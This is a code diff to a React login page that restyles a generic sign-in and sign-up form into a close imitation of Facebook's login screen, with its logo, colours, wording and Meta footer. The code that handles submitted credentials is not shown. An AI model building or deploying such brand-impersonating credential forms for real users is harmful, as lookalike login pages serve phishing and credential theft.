@@ -3,9 +3,6 @@ import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
 import { Form, FormControl, FormField, FormItem, FormMessage } from "@/components/ui/form";
-import { Input } from "@/components/ui/input";
-import { Button } from "@/components/ui/button";
-import { Separator } from "@/components/ui/separator";
 import {
   Dialog,
   DialogContent,
@@ -13,7 +10,6 @@ import {
   DialogTitle,
   DialogDescription,
 } from "@/components/ui/dialog";
-import { CircleHelp } from "lucide-react";
 
 const loginSchema = z.object({
   email: z.string().min(1, "Please enter your email or phone number"),
@@ -32,27 +28,10 @@ const signupSchema = z.object({
     day: z.string(),
     year: z.string(),
   }),
-  gender: z.string().optional(),
+  gender: z.string(),
 });
 
 type SignupForm = z.infer<typeof signupSchema>;
-
-const languages = [
-  "English (UK)", "Euskara", "Français (France)", "Galego", "Hrvatski", "Italiano", 
-  "Lietuvių", "Magyar", "Nederlands", "Norsk (bokmål)", "Polski", "Português (Brasil)", 
-  "Português (Portugal)", "Română", "Slovenčina", "Slovenščina", "Srpski", "Suomi", 
-  "Svenska", "Tiếng Việt", "Türkçe", "Ελληνικά", "Български", "Русский", "Українська",
-  "עברית", "العربية", "فارسی", "हिन्दी", "ภาษาไทย", "中文(简体)", "中文(香港)", 
-  "中文(台灣)", "日本語", "한국어"
-];
-
-const footerLinks = [
-  "Sign Up", "Log in", "Messenger", "Facebook Lite", "Video", "Places", "Games", 
-  "Marketplace", "Meta Pay", "Meta Store", "Meta Quest", "Ray-Ban Meta", "Meta AI", 
-  "Instagram", "Threads", "Fundraisers", "Services", "Voting Information Centre", 
-  "Privacy Policy", "Privacy Centre", "Groups", "About", "Create ad", "Create Page", 
-  "Developers", "Careers", "Cookies", "AdChoices", "Terms", "Help", "Contact uploading and non-users"
-];
 
 const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
 const days = Array.from({ length: 31 }, (_, i) => String(i + 1));
@@ -84,7 +63,7 @@ export default function LoginPage() {
         day: String(new Date().getDate()),
         year: String(new Date().getFullYear() - 25),
       },
-      gender: "",
+      gender: "female",
     },
   });
 
@@ -104,100 +83,141 @@ export default function LoginPage() {
   };
 
   return (
-    <div className="min-h-screen flex flex-col bg-gray-50">
-      <main className="flex-1 flex items-center justify-center px-4 py-8">
+    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#ffffff' }}>
+      {/* Language Selector */}
+      <div className="text-center pt-4 pb-6">
+        <a
+          href="#"
+          className="text-sm hover:underline"
+          style={{ color: '#65676b' }}
+          data-testid="link-language"
+        >
+          English (UK)
+        </a>
+      </div>
+
+      {/* Main Content */}
+      <main className="flex-1 flex flex-col items-center justify-center px-5 py-8">
         <div className="w-full max-w-md">
-          <div className="text-center mb-8">
-            <img 
-              src="/favicon.png" 
-              alt="Logo" 
-              className="w-12 h-12 mx-auto mb-4"
-              data-testid="img-logo"
-            />
-            <h1 
-              className="text-3xl font-bold mb-2"
-              style={{ color: '#1c1e21' }}
-              data-testid="text-title"
+          {/* Facebook "f" Logo */}
+          <div className="text-center mb-12">
+            <div
+              className="w-20 h-20 rounded-full flex items-center justify-center mx-auto"
+              style={{ backgroundColor: '#1877f2' }}
+              data-testid="logo-facebook"
             >
-              Welcome Back
-            </h1>
-            <p 
-              className="text-gray-600"
-              data-testid="text-subtitle"
-            >
-              Sign in to your account to continue
-            </p>
+              <span className="text-4xl font-bold text-white">f</span>
+            </div>
           </div>
 
-          <div className="bg-white rounded-lg shadow-sm p-6 border border-gray-200">
-            <Form {...loginForm}>
-              <form onSubmit={loginForm.handleSubmit(handleLogin)} className="space-y-4">
-                <FormField
-                  control={loginForm.control}
-                  name="email"
-                  render={({ field }) => (
-                    <FormItem>
-                      <FormControl>
-                        <input
-                          {...field}
-                          type="text"
-                          placeholder="Email or username"
-                          className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
-                          style={{ color: '#1c1e21' }}
-                          data-testid="input-email"
-                        />
-                      </FormControl>
-                      <FormMessage className="text-sm" style={{ color: '#dc2626' }} />
-                    </FormItem>
-                  )}
-                />
+          {/* Login Form */}
+          <Form {...loginForm}>
+            <form onSubmit={loginForm.handleSubmit(handleLogin)} className="space-y-3">
+              <FormField
+                control={loginForm.control}
+                name="email"
+                render={({ field }) => (
+                  <FormItem>
+                    <FormControl>
+                      <input
+                        {...field}
+                        type="text"
+                        placeholder="Mobile number or email address"
+                        className="w-full px-4 py-3 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
+                        style={{
+                          backgroundColor: '#ffffff',
+                          borderColor: '#dadde1',
+                          color: '#1c1e21',
+                        }}
+                        onFocus={(e) => {
+                          e.currentTarget.style.borderColor = '#1877f2';
+                          e.currentTarget.style.boxShadow = '0 0 0 3px rgba(24, 119, 242, 0.1)';
+                        }}
+                        onBlur={(e) => {
+                          e.currentTarget.style.borderColor = '#dadde1';
+                          e.currentTarget.style.boxShadow = 'none';
+                        }}
+                        data-testid="input-email"
+                      />
+                    </FormControl>
+                    <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
+                  </FormItem>
+                )}
+              />
 
-                <FormField
-                  control={loginForm.control}
-                  name="password"
-                  render={({ field }) => (
-                    <FormItem>
-                      <FormControl>
-                        <input
-                          {...field}
-                          type="password"
-                          placeholder="Password"
-                          className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
-                          style={{ color: '#1c1e21' }}
-                          data-testid="input-password"
-                        />
-                      </FormControl>
-                      <FormMessage className="text-sm" style={{ color: '#dc2626' }} />
-                    </FormItem>
-                  )}
-                />
+              <FormField
+                control={loginForm.control}
+                name="password"
+                render={({ field }) => (
+                  <FormItem>
+                    <FormControl>
+                      <input
+                        {...field}
+                        type="password"
+                        placeholder="Password"
+                        className="w-full px-4 py-3 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
+                        style={{
+                          backgroundColor: '#ffffff',
+                          borderColor: '#dadde1',
+                          color: '#1c1e21',
+                        }}
+                        onFocus={(e) => {
+                          e.currentTarget.style.borderColor = '#1877f2';
+                          e.currentTarget.style.boxShadow = '0 0 0 3px rgba(24, 119, 242, 0.1)';
+                        }}
+                        onBlur={(e) => {
+                          e.currentTarget.style.borderColor = '#dadde1';
+                          e.currentTarget.style.boxShadow = 'none';
+                        }}
+                        data-testid="input-password"
+                      />
+                    </FormControl>
+                    <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
+                  </FormItem>
+                )}
+              />
 
-                <button
-                  type="submit"
-                  disabled={isLoggingIn}
-                  className="w-full py-3 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-700 transition disabled:opacity-70"
-                  data-testid="button-login"
-                >
-                  {isLoggingIn ? "Signing in..." : "Sign in"}
-                </button>
-              </form>
-            </Form>
-
-            <div className="mt-4 text-center">
-              <a
-                href="#"
-                className="text-sm text-blue-600 hover:underline"
-                data-testid="link-forgotten-password"
+              {/* Log in Button */}
+              <button
+                type="submit"
+                disabled={isLoggingIn}
+                className="w-full py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-60"
+                style={{
+                  backgroundColor: '#1877f2',
+                }}
+                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
+                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
+                data-testid="button-login"
               >
-                Forgot password?
-              </a>
-            </div>
+                {isLoggingIn ? "Logging in..." : "Log in"}
+              </button>
+            </form>
+          </Form>
 
-            <div className="my-4 border-t border-gray-200" />
+          {/* Forgotten Password Link */}
+          <div className="text-center mt-6">
+            <a
+              href="#"
+              className="text-sm hover:underline"
+              style={{ color: '#1877f2' }}
+              data-testid="link-forgotten-password"
+            >
+              Forgotten password?
+            </a>
+          </div>
 
+          {/* Create New Account Button */}
+          <div className="mt-8 pt-4" style={{ borderTop: '1px solid #dadde1' }}>
             <button
               onClick={() => setSignupOpen(true)}
-              className="w-full py-3 bg-green-600 text-white font-semibold rounded-lg hover:bg-green-700 transition"
+              className="w-full py-3 text-sm font-bold rounded-full transition"
+              style={{
+                backgroundColor: '#ffffff',
+                color: '#1877f2',
+                border: '1px solid #1877f2',
+              }}
+              onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#f0f2f5')}
+              onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#ffffff')}
               data-testid="button-create-account"
             >
               Create new account
@@ -206,17 +226,42 @@ export default function LoginPage() {
         </div>
       </main>
 
+      {/* Footer */}
+      <footer className="text-center py-8 px-5" style={{ color: '#65676b' }}>
+        <div className="max-w-md mx-auto mb-3">
+          <a href="#" className="text-xs hover:underline mr-3" data-testid="link-meta">
+            Meta
+          </a>
+        </div>
+        <div className="text-xs">
+          <a href="#" className="hover:underline mr-2" data-testid="link-about">
+            About
+          </a>
+          <a href="#" className="hover:underline mr-2" data-testid="link-help">
+            Help
+          </a>
+          <a href="#" className="hover:underline" data-testid="link-more">
+            More
+          </a>
+        </div>
+      </footer>
+
+      {/* Sign Up Dialog */}
       <Dialog open={signupOpen} onOpenChange={setSignupOpen}>
-        <DialogContent className="sm:max-w-[400px] p-6 gap-0 bg-white rounded-lg">
-          <DialogHeader className="mb-4">
-            <DialogTitle className="text-2xl font-bold" style={{ color: '#1c1e21' }}>Create Account</DialogTitle>
-            <DialogDescription className="text-sm mt-1" style={{ color: '#606770' }}>
-              Join us today
+        <DialogContent className="sm:max-w-[432px] p-0 gap-0 bg-white rounded-lg overflow-hidden border-0">
+          <DialogHeader className="p-4 pb-0">
+            <DialogTitle className="text-2xl font-bold" style={{ color: '#1c1e21' }}>
+              Sign Up
+            </DialogTitle>
+            <DialogDescription className="text-sm mt-1" style={{ color: '#65676b' }}>
+              It's quick and easy.
             </DialogDescription>
           </DialogHeader>
 
+          <div className="my-3" style={{ borderTop: '1px solid #dadde1' }} />
+
           <Form {...signupForm}>
-            <form onSubmit={signupForm.handleSubmit(handleSignup)} className="space-y-3">
+            <form onSubmit={signupForm.handleSubmit(handleSignup)} className="px-4 pb-4 space-y-3">
               <div className="flex gap-3">
                 <FormField
                   control={signupForm.control}
@@ -227,12 +272,16 @@ export default function LoginPage() {
                         <input
                           {...field}
                           placeholder="First name"
-                          className="w-full px-3 py-2 text-sm border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition"
-                          style={{ color: '#1c1e21' }}
+                          className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
+                          style={{
+                            backgroundColor: '#f5f6f7',
+                            borderColor: '#ccd0d5',
+                            color: '#1c1e21',
+                          }}
                           data-testid="input-firstname"
                         />
                       </FormControl>
-                      <FormMessage className="text-xs" style={{ color: '#dc2626' }} />
+                      <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                     </FormItem>
                   )}
                 />
@@ -244,13 +293,17 @@ export default function LoginPage() {
                       <FormControl>
                         <input
                           {...field}
-                          placeholder="Last name"
-                          className="w-full px-3 py-2 text-sm border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition"
-                          style={{ color: '#1c1e21' }}
+                          placeholder="Surname"
+                          className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
+                          style={{
+                            backgroundColor: '#f5f6f7',
+                            borderColor: '#ccd0d5',
+                            color: '#1c1e21',
+                          }}
                           data-testid="input-lastname"
                         />
                       </FormControl>
-                      <FormMessage className="text-xs" style={{ color: '#dc2626' }} />
+                      <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                     </FormItem>
                   )}
                 />
@@ -264,13 +317,17 @@ export default function LoginPage() {
                     <FormControl>
                       <input
                         {...field}
-                        placeholder="Email or phone"
-                        className="w-full px-3 py-2 text-sm border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition"
-                        style={{ color: '#1c1e21' }}
+                        placeholder="Mobile number or email address"
+                        className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
+                        style={{
+                          backgroundColor: '#f5f6f7',
+                          borderColor: '#ccd0d5',
+                          color: '#1c1e21',
+                        }}
                         data-testid="input-signup-email"
                       />
                     </FormControl>
-                    <FormMessage className="text-xs" style={{ color: '#dc2626' }} />
+                    <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                   </FormItem>
                 )}
               />
@@ -284,75 +341,110 @@ export default function LoginPage() {
                       <input
                         {...field}
                         type="password"
-                        placeholder="Password"
-                        className="w-full px-3 py-2 text-sm border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition"
-                        style={{ color: '#1c1e21' }}
+                        placeholder="New password"
+                        className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
+                        style={{
+                          backgroundColor: '#f5f6f7',
+                          borderColor: '#ccd0d5',
+                          color: '#1c1e21',
+                        }}
                         data-testid="input-signup-password"
                       />
                     </FormControl>
-                    <FormMessage className="text-xs" style={{ color: '#dc2626' }} />
+                    <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                   </FormItem>
                 )}
               />
 
               <div>
-                <label className="text-xs text-gray-700 block mb-1">Date of birth</label>
-                <div className="flex gap-2">
+                <label className="text-xs" style={{ color: '#65676b' }}>
+                  Date of birth
+                </label>
+                <div className="flex gap-3 mt-1">
                   <select
-                    className="flex-1 px-2 py-2 text-sm border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition"
-                    style={{ color: '#1c1e21' }}
+                    className="flex-1 px-2 py-1 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
+                    style={{
+                      backgroundColor: '#f5f6f7',
+                      borderColor: '#ccd0d5',
+                      color: '#1c1e21',
+                    }}
                     value={signupForm.watch("birthday.month")}
                     onChange={(e) => signupForm.setValue("birthday.month", e.target.value)}
                     data-testid="select-birthday-month"
                   >
                     {months.map((m, idx) => (
-                      <option key={idx} value={String(idx)}>{m}</option>
+                      <option key={idx} value={String(idx)}>
+                        {m}
+                      </option>
                     ))}
                   </select>
                   <select
-                    className="flex-1 px-2 py-2 text-sm border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition"
-                    style={{ color: '#1c1e21' }}
+                    className="flex-1 px-2 py-1 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
+                    style={{
+                      backgroundColor: '#f5f6f7',
+                      borderColor: '#ccd0d5',
+                      color: '#1c1e21',
+                    }}
                     value={signupForm.watch("birthday.day")}
                     onChange={(e) => signupForm.setValue("birthday.day", e.target.value)}
                     data-testid="select-birthday-day"
                   >
                     {days.map((d) => (
-                      <option key={d} value={d}>{d}</option>
+                      <option key={d} value={d}>
+                        {d}
+                      </option>
                     ))}
                   </select>
                   <select
-                    className="flex-1 px-2 py-2 text-sm border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition"
-                    style={{ color: '#1c1e21' }}
+                    className="flex-1 px-2 py-1 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
+                    style={{
+                      backgroundColor: '#f5f6f7',
+                      borderColor: '#ccd0d5',
+                      color: '#1c1e21',
+                    }}
                     value={signupForm.watch("birthday.year")}
                     onChange={(e) => signupForm.setValue("birthday.year", e.target.value)}
                     data-testid="select-birthday-year"
                   >
                     {years.map((y) => (
-                      <option key={y} value={y}>{y}</option>
+                      <option key={y} value={y}>
+                        {y}
+                      </option>
                     ))}
                   </select>
                 </div>
               </div>
 
               <div>
-                <label className="text-xs text-gray-700 block mb-1">Gender</label>
-                <div className="flex gap-2">
+                <label className="text-xs" style={{ color: '#65676b' }}>
+                  Gender
+                </label>
+                <div className="flex gap-3 mt-1">
                   {[
                     { value: "female", label: "Female" },
                     { value: "male", label: "Male" },
                     { value: "custom", label: "Custom" },
                   ].map((option) => (
-                    <label key={option.value} className="flex-1 flex items-center gap-2 cursor-pointer">
+                    <label
+                      key={option.value}
+                      className="flex-1 flex items-center justify-between px-3 py-2 border rounded-md cursor-pointer"
+                      style={{
+                        backgroundColor: '#f5f6f7',
+                        borderColor: '#ccd0d5',
+                      }}
+                    >
+                      <span className="text-sm" style={{ color: '#1c1e21' }}>
+                        {option.label}
+                      </span>
                       <input
                         type="radio"
                         name="gender"
                         value={option.value}
                         onChange={(e) => signupForm.setValue("gender", e.target.value)}
                         checked={signupForm.watch("gender") === option.value}
-                        className="w-4 h-4"
+                        className="w-4 h-4 cursor-pointer"
                         data-testid={`radio-gender-${option.value}`}
                       />
-                      <span className="text-sm" style={{ color: '#1c1e21' }}>{option.label}</span>
                     </label>
                   ))}
                 </div>
@@ -361,10 +453,13 @@ export default function LoginPage() {
               <button
                 type="submit"
                 disabled={isSigningUp}
-                className="w-full py-2 bg-green-600 text-white font-semibold rounded-lg hover:bg-green-700 transition disabled:opacity-70"
+                className="w-auto px-16 py-2 text-white text-base font-bold rounded-md transition disabled:opacity-60 mx-auto block"
+                style={{ backgroundColor: '#00a400' }}
+                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#009200')}
+                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#00a400')}
                 data-testid="button-signup-submit"
               >
-                {isSigningUp ? "Creating..." : "Sign Up"}
+                {isSigningUp ? "Signing up..." : "Sign Up"}
               </button>
             </form>
           </Form>
